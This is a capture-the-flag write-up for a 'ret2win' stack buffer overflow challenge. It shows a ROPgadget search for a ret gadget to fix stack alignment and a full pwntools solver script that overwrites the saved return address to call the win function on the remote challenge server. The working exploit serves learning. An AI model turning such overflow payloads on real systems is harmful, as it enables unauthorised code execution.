---
description: Binary Exploitation
---

# ret2win

> _Buffer overflow di stack bisa kita gunakan untuk overwrite saved RIP. Kita bisa overwrite dengan alamat fungsi win untuk menjalankannya._
>
> _Author: zran_

{% file src="../../.gitbook/assets/ret2win1.zip" %}

Simple buffer overflow challenge, but the only roadblock for me was _stack alignment_ on the remote so i learned how to use ROPgadget to find a simple ret gadget to solve this.

```
$ ROPgadget --binary ret2win | grep 'ret'
...
0x000000000040118f : nop ; ret
...
```

This was the solver script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ret2win --host playground.tcp1p.team --port 19000
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'ret2win')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141 EXE=/tmp/executable
host = args.HOST or 'playground.tcp1p.team'
port = int(args.PORT or 19000)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# SHSTK:      Enabled
# IBT:        Enabled
# Stripped:   No

io = start()

ret = p64(0x40118f)
win = p64(0x401216)

payload = b'A' * 120
payload += ret
payload += win
log.info(payload)

log.info(io.clean())
io.sendline(payload)
log.info(io.clean())
io.interactive()
```

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
